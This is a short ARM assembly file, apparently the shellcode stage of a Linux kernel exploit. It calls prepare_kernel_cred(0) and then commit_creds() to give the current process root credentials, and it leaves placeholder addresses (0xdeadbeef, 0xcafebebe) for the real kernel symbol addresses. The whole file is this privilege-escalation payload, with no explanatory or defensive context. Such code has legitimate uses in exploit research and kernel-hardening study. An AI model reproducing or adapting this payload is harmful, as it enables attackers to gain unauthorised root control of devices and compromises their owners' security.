.section .text
.global _start

_start:
	push {lr}
	mov r0, #0
	ldr r2, [pc, #(prepare_kernel_cred_addr - . - 8)]
	blx r2
	ldr r2, [pc, #(commit_creds_addr - . - 8)]
	blx r2
	pop {pc}
prepare_kernel_cred_addr:
.word 0xdeadbeef
commit_creds_addr:
.word 0xcafebebe
